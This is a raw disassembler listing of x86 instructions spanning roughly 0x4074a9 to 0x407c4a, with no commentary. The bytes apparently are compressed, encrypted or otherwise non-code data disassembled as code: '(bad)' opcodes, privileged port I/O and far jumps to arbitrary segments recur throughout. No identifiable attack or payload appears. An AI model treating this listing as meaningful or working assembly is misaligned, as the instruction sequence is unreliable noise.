  4074a9:	fild   WORD PTR [ecx+0x61]
  4074ac:	out    dx,eax
  4074ad:	mov    ebp,0xa48d3d70
  4074b2:	mov    bl,bh
  4074b4:	sar    ch,0x37
  4074b7:	mov    ds:0x361569e0,eax
  4074bc:	lods   al,BYTE PTR ds:[esi]
  4074bd:	add    esi,DWORD PTR [ebx+0x28bdb2b5]
  4074c3:	out    dx,eax
  4074c4:	addr16 mov ebp,0x3d2d2ac1
  4074ca:	(bad)  
  4074cb:	push   cs
  4074cc:	adc    al,0x3b
  4074ce:	dec    eax
  4074cf:	pop    edx
  4074d0:	push   ecx
  4074d1:	sbb    ch,BYTE PTR [ebp-0x4a405a45]
  4074d7:	push   ecx
  4074d8:	rol    dh,cl
  4074da:	mov    bh,0x8e
  4074dc:	fsubr  QWORD PTR [esp+edi*8]
  4074df:	mov    dh,0x6e
  4074e1:	and    al,0x7
  4074e3:	in     eax,0xd
  4074e5:	xor    al,0x2e
  4074e7:	xlat   BYTE PTR ds:[ebx]
  4074e8:	mov    edx,0x671a0906
  4074ed:	jmp    0xd6f5:0xf47985bf
  4074f4:	push   edi
  4074f5:	jo     0x4074ea
  4074f7:	mov    ebx,0xdb908db
  4074fc:	jns    0x407486
  4074fe:	xor    BYTE PTR [edx-0x37],ah
  407501:	test   BYTE PTR [eax],al
  407503:	add    al,0xd9
  407505:	xchg   BYTE PTR ds:0xe11e447c,ah
  40750b:	inc    esi
  40750c:	xchg   ecx,eax
  40750d:	das    
  40750e:	add    eax,0xa245d06f
  407513:	inc    esi
  407514:	mov    dh,0x0
  407516:	pushf  
  407517:	mov    cl,0xb1
  407519:	add    edi,DWORD PTR [edi+0x3a]
  40751c:	jmp    0x719c:0xd0af607e
  407523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407524:	push   DWORD PTR [eax+0x79]
  407527:	ret    
  407528:	pop    ecx
  407529:	dec    eax
  40752a:	mov    al,ds:0x9fd935bf
  40752f:	cwde   
  407530:	pop    ecx
  407531:	inc    ebx
  407532:	loopne 0x4074f1
  407534:	lods   eax,DWORD PTR ds:[esi]
  407535:	test   edi,esp
  407537:	jmp    0x9e3b:0x6ea62ca2
  40753e:	sub    al,0x10
  407540:	shl    edi,cl
  407542:	xor    al,BYTE PTR ds:0xe026bdcc
  407548:	out    0xe6,eax
  40754a:	mov    edx,0x8a4631c6
  40754f:	data16 jecxz 0x40750c
  407552:	aas    
  407553:	call   0x13ec7bec
  407558:	sbb    BYTE PTR [edx],al
  40755a:	push   ebp
  40755b:	xchg   ebx,eax
  40755c:	add    al,0xe
  40755e:	cmp    ch,ah
  407560:	repz iret 
  407562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407563:	retf   0x246d
  407566:	pop    eax
  407567:	mov    ch,0xe4
  407569:	leave  
  40756a:	stc    
  40756b:	dec    eax
  40756c:	mov    eax,ds:0x95a62fb
  407571:	or     edi,DWORD PTR [ecx-0x71]
  407574:	clc    
  407575:	mov    edx,0x8d94b46e
  40757a:	push   eax
  40757b:	pop    ecx
  40757c:	push   ebx
  40757d:	shl    DWORD PTR [ebp+0x24],1
  407580:	stc    
  407581:	push   ds
  407582:	jl     0x407532
  407584:	jle    0x40758d
  407586:	jnp    0x407594
  407588:	xor    al,0xce
  40758a:	cli    
  40758b:	pmuludq mm6,QWORD PTR [edx]
  40758e:	ins    DWORD PTR es:[edi],dx
  40758f:	in     eax,0xa3
  407591:	push   eax
  407592:	push   ds
  407593:	sbb    eax,0x36d80afe
  407598:	stos   DWORD PTR es:[edi],eax
  407599:	cmp    eax,0x8d51775b
  40759e:	mov    al,ds:0xdceeec1d
  4075a3:	retf   
  4075a4:	mov    ds:0x58758eb6,al
  4075a9:	xchg   BYTE PTR [eax+ebp*8],bh
  4075ac:	pop    ebp
  4075ad:	mov    DWORD PTR [esi-0x127eefa8],ecx
  4075b3:	ins    BYTE PTR es:[edi],dx
  4075b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075b5:	adc    eax,0x8c1f3d68
  4075ba:	mov    ds:0x9054ccb4,eax
  4075bf:	or     BYTE PTR [eax+0x37],ch
  4075c2:	gs xchg edx,eax
  4075c4:	outs   dx,BYTE PTR ds:[esi]
  4075c5:	std    
  4075c6:	sub    BYTE PTR ds:0x5defb25a,al
  4075cc:	mov    bh,0xef
  4075ce:	lock int3 
  4075d0:	(bad)  [ebp+0x922d1ab]
  4075d6:	stc    
  4075d7:	lods   al,BYTE PTR ds:[esi]
  4075d8:	jb     0x4075ee
  4075da:	shr    DWORD PTR [ecx-0x56b2b4f],cl
  4075e0:	ror    DWORD PTR [ecx-0x39],0xbd
  4075e4:	jg     0x407606
  4075e6:	aaa    
  4075e7:	mov    BYTE PTR [edi-0x4224f2d7],bl
  4075ed:	mov    edx,0x41adfc39
  4075f2:	fild   DWORD PTR [edi-0x6f]
  4075f5:	aas    
  4075f6:	(bad)  
  4075f7:	es push ss
  4075f9:	mov    dl,0xc9
  4075fb:	adc    al,0xb8
  4075fd:	mov    DWORD PTR [eax+0x49a97ed1],edx
  407603:	cwde   
  407604:	fwait
  407605:	rcr    BYTE PTR [esi-0xf6c08ef],0x73
  40760c:	sub    BYTE PTR [ebx-0xa33af1b],ch
  407612:	test   BYTE PTR [eax],0x11
  407615:	pop    edx
  407616:	adc    ecx,DWORD PTR [esi+0x1d]
  407619:	push   es
  40761a:	(bad)  [edi-0x6a]
  40761d:	aas    
  40761e:	push   es
  40761f:	ret    
  407620:	add    al,0x2
  407622:	test   DWORD PTR [ecx-0x535c692d],ebp
  407628:	jg     0x40768b
  40762a:	cli    
  40762b:	pop    edi
  40762c:	or     BYTE PTR [edx],cl
  40762e:	xchg   ebp,eax
  40762f:	out    dx,al
  407630:	mov    DWORD PTR [esi-0x6cd3f407],ebx
  407636:	xchg   esp,eax
  407637:	repnz icebp 
  407639:	cmp    DWORD PTR [ecx],eax
  40763b:	pop    eax
  40763c:	in     al,dx
  40763d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40763e:	dec    ebx
  40763f:	lods   al,BYTE PTR ds:[esi]
  407640:	not    DWORD PTR [ecx+0x615eb390]
  407646:	(bad)  
  407647:	jnp    0x40769c
  407649:	xchg   BYTE PTR [esi-0xf],ah
  40764c:	push   eax
  40764d:	xor    al,BYTE PTR [eax+0x62]
  407650:	pushf  
  407651:	adc    al,0x9
  407653:	lock mov esi,0x6d811f95
  407659:	jle    0x4076ab
  40765b:	pushf  
  40765c:	pop    eax
  40765d:	sbb    al,0x4
  40765f:	mov    edx,0xe019e5c3
  407664:	mov    cl,0x28
  407666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407667:	clc    
  407668:	pop    ecx
  407669:	call   0x823cb761
  40766e:	mov    esp,0xa17ce2dc
  407673:	pop    ds
  407674:	xchg   BYTE PTR [esi-0x1b1d43a9],dh
  40767a:	imul   ebp,DWORD PTR [ebx-0x19],0x2f
  40767e:	aaa    
  40767f:	stos   BYTE PTR es:[edi],al
  407680:	sti    
  407681:	pop    es
  407682:	xchg   edx,eax
  407683:	pop    esi
  407684:	and    dh,BYTE PTR [esp+ecx*8+0x6fbb657c]
  40768b:	xor    esp,DWORD PTR [ecx-0x24]
  40768e:	adc    al,0x21
  407690:	dec    esi
  407691:	fcom   DWORD PTR [ecx+0x657a1d97]
  407697:	pop    esp
  407698:	mov    ebp,0x36b3ae48
  40769d:	and    BYTE PTR [eax-0x16],al
  4076a0:	pop    edi
  4076a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076a3:	rcr    DWORD PTR [ebx+0x120a74],0x88
  4076aa:	pop    ecx
  4076ab:	xor    esi,DWORD PTR [esi-0x716c466c]
  4076b1:	aam    0x3f
  4076b3:	mov    dl,0x1f
  4076b5:	(bad)  
  4076b6:	push   ebp
  4076b7:	cld    
  4076b8:	dec    ecx
  4076b9:	scas   eax,DWORD PTR es:[edi]
  4076ba:	push   edx
  4076bb:	or     al,0xc7
  4076bd:	mov    al,0xd
  4076bf:	les    eax,FWORD PTR [esi]
  4076c1:	in     al,0xa4
  4076c3:	mov    ah,0xc9
  4076c5:	push   0x179cbdfc
  4076ca:	sbb    eax,0x5ea12217
  4076cf:	or     edi,DWORD PTR [eax]
  4076d1:	outs   dx,DWORD PTR ds:[esi]
  4076d2:	imul   edi,DWORD PTR [ebx],0x2961510e
  4076d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076d9:	repz xor eax,0x8a5fdc38
  4076df:	imul   dl
  4076e1:	rol    esp,1
  4076e3:	shl    BYTE PTR [ebx+ebx*2],cl
  4076e6:	push   esp
  4076e7:	jl     0x407687
  4076e9:	int3   
  4076ea:	cmp    eax,DWORD PTR [ebx+0x7e5d04d0]
  4076f0:	xor    edi,DWORD PTR [esi-0x12]
  4076f3:	push   es
  4076f4:	jb     0x407771
  4076f6:	sub    al,BYTE PTR [ebp+edx*1-0x4d35a10e]
  4076fd:	sbb    al,0x5c
  4076ff:	fcmovne st,st(5)
  407701:	popf   
  407702:	pop    es
  407703:	loope  0x407741
  407705:	(bad)  
  407706:	pop    esp
  407707:	xchg   edx,eax
  407708:	cmp    DWORD PTR [esi-0x22f3ce8],ebx
  40770e:	or     eax,0x5f3b5d39
  407713:	and    eax,0x73756acf
  407718:	outs   dx,DWORD PTR ds:[esi]
  407719:	fmul   DWORD PTR [edi-0x33]
  40771c:	fidiv  DWORD PTR [ebx+0x59d54407]
  407722:	adc    eax,0x73bf418f
  407727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407728:	dec    edi
  407729:	or     BYTE PTR [edx],0x94
  40772c:	add    ebx,esp
  40772e:	jmp    0xd5434bc
  407733:	lods   al,BYTE PTR ds:[esi]
  407734:	sbb    BYTE PTR [eax],bl
  407736:	mov    ch,0x39
  407738:	pop    es
  407739:	pop    esi
  40773a:	aam    0x12
  40773c:	adc    al,0x8b
  40773e:	jo     0x40775b
  407740:	cmc    
  407741:	xlat   BYTE PTR ds:[ebx]
  407742:	inc    edi
  407743:	inc    esp
  407744:	jge    0x407702
  407746:	push   0x738726bb
  40774b:	inc    esi
  40774c:	mov    al,ds:0x63863c4c
  407751:	clc    
  407752:	push   ecx
  407753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407754:	xchg   DWORD PTR [edx],ebp
  407756:	push   esp
  407757:	outs   dx,BYTE PTR ds:[esi]
  407758:	inc    edx
  407759:	ret    
  40775a:	jge    0x407754
  40775c:	inc    esi
  40775d:	fsub   DWORD PTR [ebp-0x45]
  407760:	sahf   
  407761:	add    BYTE PTR [ebp-0x5c],cl
  407764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407765:	clc    
  407766:	daa    
  407767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407768:	adc    cl,BYTE PTR [edi+0x33]
  40776b:	push   ecx
  40776c:	mov    edx,0xf97e3251
  407771:	retf   0x3f3e
  407774:	sub    bl,BYTE PTR [ebp-0x6c132c36]
  40777a:	or     esp,esp
  40777c:	mov    ds:0x49c4bcf4,al
  407781:	jmp    0x79f44363
  407786:	cwde   
  407787:	ja     0x407792
  407789:	inc    esp
  40778a:	mov    bl,0xc3
  40778c:	(bad)  
  40778d:	xor    DWORD PTR ds:[edx+0x11f862da],ebp
  407794:	in     al,0xe9
  407796:	pusha  
  407797:	outs   dx,BYTE PTR ds:[esi]
  407798:	loopne 0x40780f
  40779a:	pop    ds
  40779b:	sti    
  40779c:	push   ds
  40779d:	cmp    esi,DWORD PTR [ecx-0x38b47fcd]
  4077a3:	push   ebp
  4077a4:	je     0x4077da
  4077a6:	into   
  4077a7:	push   cs
  4077a8:	hlt    
  4077a9:	div    ah
  4077ab:	mov    ebx,0xd2f92b6b
  4077b0:	jno    0x40778f
  4077b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077b3:	test   al,0x63
  4077b5:	fsub   st,st(2)
  4077b7:	cmp    BYTE PTR [eax+ebp*8-0x2fe1005d],bh
  4077be:	nop
  4077bf:	sbb    eax,0xca1b92c3
  4077c4:	jp     0x4077ea
  4077c6:	dec    esp
  4077c7:	aad    0xff
  4077c9:	cdq    
  4077ca:	push   ecx
  4077cb:	mov    bl,0x27
  4077cd:	in     eax,dx
  4077ce:	sti    
  4077cf:	outs   dx,BYTE PTR ds:[esi]
  4077d0:	std    
  4077d1:	mov    dl,0xc6
  4077d3:	mov    edx,0x69146a21
  4077d8:	mov    ebx,DWORD PTR [esi+0x7ad80f8e]
  4077de:	addr16 in al,0x78
  4077e1:	xor    al,0x99
  4077e3:	dec    ecx
  4077e4:	jbe    0x40780f
  4077e6:	mov    esi,0x11ee56de
  4077eb:	inc    ebx
  4077ec:	loop   0x4077a5
  4077ee:	out    0x69,al
  4077f0:	shl    DWORD PTR [edi],1
  4077f2:	pop    ds
  4077f3:	sbb    bl,BYTE PTR [ebp-0x3139e44a]
  4077f9:	push   0xffffffc9
  4077fb:	cs xor edx,ebp
  4077fe:	inc    ecx
  4077ff:	es nop
  407801:	(bad)  
  407802:	mov    ds,WORD PTR [ebx]
  407804:	stc    
  407805:	outs   dx,BYTE PTR ds:[si]
  407807:	outs   dx,DWORD PTR ds:[esi]
  407808:	push   0x60160e7d
  40780d:	out    dx,al
  40780e:	gs inc esi
  407810:	test   al,0xff
  407812:	out    0xda,al
  407814:	mov    eax,0xb12f09a5
  407819:	jnp    0x4077da
  40781b:	mov    ds:0x4288f986,eax
  407820:	or     DWORD PTR [esi+0x38],ebp
  407823:	dec    eax
  407824:	(bad)  [eax-0x1fe4490a]
  40782a:	jp     0x407881
  40782c:	add    eax,0xcac6b233
  407831:	xchg   dh,dl
  407833:	cmp    al,0x36
  407835:	nop
  407836:	adc    al,0x9c
  407838:	lahf   
  407839:	or     eax,0x201d08a7
  40783f:	mov    BYTE PTR [ebp+0x75e21e31],ah
  407845:	fwait
  407846:	mov    ebx,0x3414479d
  40784b:	pop    eax
  40784c:	dec    eax
  40784d:	lahf   
  40784e:	pop    eax
  40784f:	mov    ch,0x97
  407851:	ins    DWORD PTR es:[edi],dx
  407852:	fst    DWORD PTR [esi]
  407854:	gs mov edi,0x5b4d794a
  40785a:	ficomp DWORD PTR [ebx-0x55f800ef]
  407860:	and    DWORD PTR [eax-0x33d45ff8],0xffffffa7
  407867:	rcr    BYTE PTR [eax-0x69140cd4],cl
  40786d:	xor    eax,0x9f047ee8
  407872:	stc    
  407873:	ins    BYTE PTR es:[edi],dx
  407874:	cwde   
  407875:	push   0xfffffffe
  407877:	cmp    al,0x9c
  407879:	cmp    edx,ecx
  40787b:	popa   
  40787c:	ret    
  40787d:	imul   ebx,DWORD PTR es:[esi+edi*1],0x8ba24649
  407885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407886:	xchg   esp,eax
  407887:	jle    0x4078b7
  407889:	cmp    eax,0x9f2933a8
  40788e:	stos   DWORD PTR es:[edi],eax
  40788f:	shl    BYTE PTR [esi+0x377c85fd],1
  407895:	jg     0x4078cc
  407897:	sar    BYTE PTR [edi+0x71e7721],cl
  40789d:	loopne 0x40782c
  40789f:	mov    DWORD PTR [edx+0x35],eax
  4078a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078a3:	fdivr  QWORD PTR [ecx]
  4078a5:	rol    DWORD PTR [esp+esi*4-0x50f9a81d],cl
  4078ac:	fnstsw WORD PTR [esi]
  4078ae:	int3   
  4078af:	mov    eax,0xeea8db8c
  4078b4:	xlat   BYTE PTR ds:[ebx]
  4078b5:	and    edx,edx
  4078b7:	in     eax,dx
  4078b8:	fld    DWORD PTR [edx-0x6d563e0c]
  4078be:	pop    eax
  4078bf:	hlt    
  4078c0:	and    esp,DWORD PTR [eax]
  4078c2:	and    edi,DWORD PTR [edx-0x27232978]
  4078c8:	cmp    dl,BYTE PTR [edi]
  4078ca:	loope  0x407893
  4078cc:	lds    edi,FWORD PTR [edx+0x253ce697]
  4078d2:	and    edi,esi
  4078d4:	mov    cl,0x7d
  4078d6:	mov    ebx,0xac79c1e9
  4078db:	jg     0x407887
  4078dd:	bound  ebx,QWORD PTR [edx-0x16e6109e]
  4078e3:	push   eax
  4078e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078e5:	sub    al,0x5f
  4078e7:	fiadd  DWORD PTR [esi-0x72351638]
  4078ed:	loop   0x407870
  4078ef:	rol    BYTE PTR [ebx+0x540d350a],cl
  4078f5:	aas    
  4078f6:	mov    edx,0x29e097f8
  4078fb:	cli    
  4078fc:	hlt    
  4078fd:	daa    
  4078fe:	in     eax,dx
  4078ff:	lock push 0x905b097e
  407905:	sahf   
  407906:	cmc    
  407907:	dec    esp
  407908:	xor    eax,0x148a2ac1
  40790d:	sbb    BYTE PTR [ecx],cl
  40790f:	push   esp
  407910:	jne    0x407904
  407912:	or     ecx,DWORD PTR [ecx]
  407914:	cmp    cl,BYTE PTR [ebp-0x6b2c03fa]
  40791a:	and    al,BYTE PTR [edi]
  40791c:	jg     0x407909
  40791e:	sub    eax,0xa2793ff9
  407923:	push   0xeaac8abc
  407928:	lea    ebp,[ebp+0x63]
  40792b:	loopne 0x4078c1
  40792d:	xor    DWORD PTR [ecx+eax*4+0x49],eax
  407931:	dec    esi
  407932:	sbb    BYTE PTR [ebx-0x27a3539f],al
  407938:	and    al,0x40
  40793a:	adc    al,0x43
  40793c:	jb     0x4078e0
  40793e:	aaa    
  40793f:	mov    ds:0x19613efb,al
  407944:	push   eax
  407945:	mov    ds:0xaeb1c6b1,eax
  40794a:	and    dl,BYTE PTR [edi-0x2a]
  40794d:	xchg   ecx,eax
  40794e:	jmp    0x4079b5
  407950:	repz inc eax
  407952:	sahf   
  407953:	jae    0x4078fc
  407955:	into   
  407956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407957:	cmp    ebx,0x12
  40795a:	pusha  
  40795b:	jb     0x407990
  40795d:	push   esp
  40795e:	(bad)  
  40795f:	mov    edx,DWORD PTR [ebp+0x5f]
  407962:	jecxz  0x407930
  407964:	pop    ebp
  407965:	mov    cl,0xfb
  407967:	fwait
  407968:	inc    ebx
  407969:	push   esp
  40796a:	(bad)  
  40796b:	cdq    
  40796c:	ja     0x40796f
  40796e:	push   ebp
  40796f:	retf   0x7211
  407972:	adc    BYTE PTR ds:0x61d7da6a,bl
  407978:	xor    al,0x56
  40797a:	mov    al,ds:0x712a15ae
  40797f:	scas   eax,DWORD PTR es:[edi]
  407980:	imul   esi,DWORD PTR [ecx-0x25ee3640],0xffffffee
  407987:	cli    
  407988:	cmp    edx,DWORD PTR [ebp+0x12006073]
  40798e:	jae    0x40795b
  407990:	xchg   BYTE PTR [eax-0x21db24f6],al
  407996:	xor    esp,0xffffffac
  407999:	jmp    0xe984ca3f
  40799e:	nop
  40799f:	pop    edi
  4079a0:	fstp   TBYTE PTR [ebx+0x744b085]
  4079a6:	aas    
  4079a7:	int    0x68
  4079a9:	(bad)  
  4079aa:	out    0x92,ax
  4079ad:	ret    0x353
  4079b0:	test   eax,0xc912fb7f
  4079b5:	and    DWORD PTR [ebp+0x55],ebp
  4079b8:	inc    ecx
  4079b9:	cdq    
  4079ba:	dec    ecx
  4079bb:	shl    BYTE PTR [ebx],0xe8
  4079be:	ins    BYTE PTR es:[edi],dx
  4079bf:	shl    BYTE PTR [esi],cl
  4079c1:	mov    bh,0xcc
  4079c3:	shr    eax,1
  4079c5:	sbb    edx,DWORD PTR [edx+0x569ba741]
  4079cb:	pop    esp
  4079cc:	(bad)  
  4079cd:	bound  edx,QWORD PTR [esi+0x32]
  4079d0:	rcr    DWORD PTR [eax],1
  4079d2:	ja     0x407a0f
  4079d4:	pop    ebx
  4079d5:	push   ds
  4079d6:	pop    esp
  4079d7:	ret    
  4079d8:	adc    bl,BYTE PTR [ecx]
  4079da:	xchg   ebp,eax
  4079db:	cwde   
  4079dc:	cli    
  4079dd:	mov    bl,0x74
  4079df:	repnz rcl BYTE PTR es:[eax+0x1e],cl
  4079e4:	outs   dx,DWORD PTR ds:[esi]
  4079e5:	or     DWORD PTR [esi+eiz*1],ebx
  4079e8:	sub    BYTE PTR [ebx-0x32],0x8b
  4079ec:	push   ss
  4079ed:	push   ss
  4079ee:	push   ebx
  4079ef:	popa   
  4079f0:	sbb    eax,0x4d23d008
  4079f5:	ins    BYTE PTR es:[edi],dx
  4079f6:	jnp    0x407999
  4079f8:	xchg   edi,eax
  4079f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079fa:	and    esi,DWORD PTR [edx]
  4079fc:	fs push eax
  4079fe:	rcr    DWORD PTR [esi],0xc7
  407a01:	jbe    0x4079c5
  407a03:	jne    0x407a0a
  407a05:	sub    BYTE PTR [ebx+0x494b2e2f],cl
  407a0b:	mov    eax,0x929064c
  407a10:	fmul   st,st(1)
  407a12:	fistp  DWORD PTR [edx-0x7f]
  407a15:	repnz fisubr DWORD PTR [eax+ebp*4+0x1e]
  407a1a:	jbe    0x40799f
  407a1c:	leave  
  407a1d:	jmp    0x342a:0xe62cc421
  407a24:	js     0x4079b1
  407a26:	sbb    edx,DWORD PTR [edi-0x3]
  407a29:	or     dh,bh
  407a2b:	popa   
  407a2c:	fiadd  WORD PTR [esi+0x31]
  407a2f:	adc    al,0xd8
  407a31:	xchg   edx,eax
  407a32:	out    dx,al
  407a33:	je     0x407a99
  407a35:	ja     0x4079e4
  407a37:	jae    0x4079ea
  407a39:	push   0x758b4ac8
  407a3e:	add    eax,0x9c16e07a
  407a43:	jnp    0x407a3e
  407a45:	inc    ebx
  407a46:	nop
  407a47:	adc    BYTE PTR [ebp-0x672da216],dl
  407a4d:	clc    
  407a4e:	jno    0x407a70
  407a50:	test   BYTE PTR [eax-0x79],ch
  407a53:	ret    
  407a54:	out    dx,eax
  407a55:	mov    BYTE PTR [esi],ch
  407a57:	(bad)  
  407a58:	sbb    esi,edi
  407a5a:	push   DWORD PTR [edi+eiz*2-0x4a74348e]
  407a61:	push   ds
  407a62:	lea    eax,[ecx-0x37]
  407a65:	out    0x89,al
  407a67:	ds xor al,0x1a
  407a6a:	push   ecx
  407a6b:	hlt    
  407a6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a6d:	enter  0x4ff0,0xf4
  407a71:	xchg   al,al
  407a73:	pop    es
  407a74:	mul    BYTE PTR [ebx]
  407a76:	xor    edi,edi
  407a78:	mov    esi,0xc2b5ba2e
  407a7d:	aaa    
  407a7e:	dec    eax
  407a7f:	sbb    ch,BYTE PTR [esi]
  407a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a82:	popa   
  407a83:	push   ds
  407a84:	outs   dx,DWORD PTR ds:[esi]
  407a85:	sahf   
  407a86:	and    BYTE PTR [ebx-0x6f],dl
  407a89:	in     eax,0x42
  407a8b:	hlt    
  407a8c:	inc    ecx
  407a8d:	ror    DWORD PTR [eax],cl
  407a8f:	rcl    BYTE PTR ds:0x220ec949,0x19
  407a96:	inc    edi
  407a97:	push   esp
  407a98:	retf   
  407a99:	rcr    edx,cl
  407a9b:	fild   DWORD PTR [ebp+0x6d]
  407a9e:	sub    cl,BYTE PTR [ebx]
  407aa0:	sub    eax,0xe1c6732
  407aa5:	hlt    
  407aa6:	inc    esp
  407aa7:	ins    DWORD PTR es:[edi],dx
  407aa8:	das    
  407aa9:	mov    ds:0xc03e4d34,eax
  407aae:	sbb    ecx,DWORD PTR [ebx+0x46f47070]
  407ab4:	mov    esi,0x7a36c72d
  407ab9:	ins    BYTE PTR es:[edi],dx
  407aba:	aas    
  407abb:	sbb    BYTE PTR ds:[ecx-0x5e],bl
  407abf:	lock test al,0xff
  407ac2:	ds or  al,0xe5
  407ac5:	lods   al,BYTE PTR ds:[esi]
  407ac6:	into   
  407ac7:	sbb    BYTE PTR [edx],al
  407ac9:	xor    al,BYTE PTR [ebp-0x3e]
  407acc:	cmp    eax,0xa208dc3
  407ad1:	push   eax
  407ad2:	jmp    0xd5af:0xee0db4fc
  407ad9:	push   esi
  407ada:	mov    ah,0x9f
  407adc:	add    DWORD PTR [eax-0xdab4b4d],0xfa64622
  407ae6:	inc    ecx
  407ae7:	jb     0x407ab4
  407ae9:	test   eax,0x555a6c8a
  407aee:	iret   
  407aef:	push   0xe20f1d90
  407af4:	adc    DWORD PTR [esi-0x48],0x9a3be08c
  407afb:	xchg   ebp,eax
  407afc:	int3   
  407afd:	and    BYTE PTR [ebx+0x37],bl
  407b00:	mov    eax,ds:0x45267500
  407b05:	mov    ebp,0x628ea2e9
  407b0a:	cmp    ah,ch
  407b0c:	aad    0xa3
  407b0e:	(bad)  
  407b0f:	xor    BYTE PTR [edx],bh
  407b11:	inc    ebx
  407b12:	push   es
  407b13:	jns    0x407aed
  407b15:	sub    al,0x6a
  407b17:	das    
  407b18:	mov    edx,0xf462657a
  407b1d:	cmp    cl,BYTE PTR [esi+0x459defeb]
  407b23:	push   cs
  407b24:	jnp    0x407b56
  407b26:	lods   eax,DWORD PTR ds:[esi]
  407b27:	int    0x94
  407b29:	data16 stos BYTE PTR es:[edi],al
  407b2b:	je     0x407b01
  407b2d:	or     dl,BYTE PTR [edi]
  407b2f:	adc    ah,BYTE PTR [ebp-0x26c79788]
  407b35:	sub    al,0xcb
  407b37:	repz retf 0x3d31
  407b3b:	push   ebp
  407b3c:	inc    ecx
  407b3d:	dec    edx
  407b3e:	xchg   edx,eax
  407b3f:	sar    BYTE PTR [edi],1
  407b41:	or     dh,BYTE PTR [ebp+0x33]
  407b44:	imul   ebp,DWORD PTR [ecx+0x1d],0xffffffe4
  407b48:	adc    BYTE PTR ds:0x1051be5a,0x6
  407b4f:	sbb    al,0xb1
  407b51:	jge    0x407bd1
  407b53:	data16 int 0x2c
  407b56:	sbb    eax,0x2b351b7
  407b5b:	sub    DWORD PTR [eax],ebx
  407b5d:	and    eax,0xa6208fc0
  407b62:	(bad)  
  407b63:	mov    al,0x2f
  407b65:	sub    al,ch
  407b67:	add    BYTE PTR [ebx-0x4a],ah
  407b6a:	pop    esi
  407b6b:	es stos BYTE PTR es:[edi],al
  407b6d:	scas   al,BYTE PTR es:[edi]
  407b6e:	sub    dh,BYTE PTR [ebx]
  407b70:	loop   0x407af7
  407b72:	out    0xc,eax
  407b74:	inc    edx
  407b75:	jp     0x407b16
  407b77:	loopne 0x407bed
  407b79:	or     eax,0x41920d26
  407b7e:	inc    esi
  407b7f:	fsubr  QWORD PTR [eax+0x1f54988f]
  407b85:	das    
  407b86:	jb     0x407b19
  407b88:	sbb    esi,esi
  407b8a:	aas    
  407b8b:	mov    edx,ebx
  407b8d:	(bad)  
  407b8e:	loop   0x407b78
  407b90:	inc    eax
  407b91:	inc    esp
  407b92:	push   esi
  407b93:	and    BYTE PTR [esi-0x57c33770],ah
  407b99:	jg     0x407b1b
  407b9b:	clc    
  407b9c:	das    
  407b9d:	in     eax,dx
  407b9e:	dec    ebx
  407b9f:	(bad)  ds:0x2bd676c7
  407ba5:	ret    
  407ba6:	arpl   WORD PTR [ecx+0x32d2aa9e],dx
  407bac:	xchg   esp,eax
  407bad:	mov    ds:0x6f239bcf,al
  407bb2:	ss pop ss
  407bb4:	sahf   
  407bb5:	add    cl,BYTE PTR [ecx]
  407bb7:	mov    ecx,0xfe4f7641
  407bbc:	xchg   ebp,eax
  407bbd:	mov    al,ds:0x97bb19e2
  407bc2:	mov    bh,BYTE PTR [ecx+0x6f]
  407bc5:	aad    0x7f
  407bc7:	aad    0x8a
  407bc9:	xchg   edi,eax
  407bca:	mov    ebp,0x751ca48e
  407bcf:	bound  edi,QWORD PTR [eax+0x50a9d31]
  407bd5:	clc    
  407bd6:	sti    
  407bd7:	xchg   ebp,eax
  407bd8:	(bad)  [eax]
  407bda:	sub    BYTE PTR [ebx],0xff
  407bdd:	cwde   
  407bde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bdf:	adc    BYTE PTR [edi+0x6f],bh
  407be2:	add    edi,DWORD PTR [ecx-0xc]
  407be5:	dec    edi
  407be6:	inc    ebp
  407be7:	push   es
  407be8:	daa    
  407be9:	dec    edi
  407bea:	cmp    esi,DWORD PTR [esi-0x427b7e18]
  407bf0:	in     al,0x1f
  407bf2:	ror    BYTE PTR [edx],cl
  407bf4:	inc    edx
  407bf5:	push   ebp
  407bf6:	in     eax,dx
  407bf7:	xor    DWORD PTR [ebp+0x4e911bb4],ebx
  407bfd:	cmc    
  407bfe:	cmc    
  407bff:	xchg   DWORD PTR [edi+0x7f],ebx
  407c02:	jb     0x407c77
  407c04:	xchg   ebx,eax
  407c05:	mov    ebx,0xc6bb491c
  407c0a:	jl     0x407c62
  407c0c:	sub    eax,0x96cc922c
  407c11:	pop    ds
  407c12:	or     eax,DWORD PTR [esi-0x4b63346c]
  407c18:	cwde   
  407c19:	pusha  
  407c1a:	(bad)  
  407c1b:	aad    0x58
  407c1d:	loope  0x407c94
  407c1f:	mov    bh,bl
  407c21:	and    esp,DWORD PTR [edx+ecx*1-0x4b]
  407c25:	lahf   
  407c26:	lods   al,BYTE PTR ds:[esi]
  407c27:	mov    BYTE PTR [ecx+0x5e],bl
  407c2a:	inc    ebx
  407c2b:	inc    ebx
  407c2c:	jge    0x407bf7
  407c2e:	psadbw mm7,mm2
  407c31:	fcom   DWORD PTR [esi-0x2c]
  407c34:	add    eax,DWORD PTR [ebp-0x54]
  407c37:	(bad)  
  407c38:	ja     0x407c75
  407c3a:	adc    eax,0xa7c4ff37
  407c3f:	fabs   
  407c41:	inc    cl
  407c43:	mov    bh,0x18
  407c45:	ret    0xa80c
  407c48:	xor    bl,ch
  407c4a:	pop    eax
